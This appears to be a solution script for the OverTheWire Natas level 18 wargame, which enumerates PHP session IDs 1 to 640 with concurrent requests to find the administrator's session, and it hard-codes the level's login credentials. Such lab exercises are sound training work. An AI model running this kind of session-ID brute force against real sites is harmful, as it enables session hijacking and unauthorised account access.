#! /usr/bin/env python3
import aiohttp
import asyncio
import time


url = "http://natas18.natas.labs.overthewire.org/"
auth = aiohttp.BasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
fail_str = "You are logged in as a regular user."


async def scrape_task(n):
    async with aiohttp.ClientSession() as session:
        cookies = {'PHPSESSID': str(n)}
        async with session.get(url, auth=auth, cookies=cookies) as resp:
            # if fail_str not in (text := await resp.text()):
            text = await resp.text()
            if fail_str not in text:
                print('FIND IT!!!!!\n\n\n' + text)


async def main():
    tasks = []
    for n in range(1, 641):
        tasks.append(scrape_task(n))
    await asyncio.wait(tasks)


if __name__ == "__main__":
    t1 = time.perf_counter()
    asyncio.run(main())
    t2 = time.perf_counter() - t1
    print(f'Total time taken: {t2:0.2f} seconds')
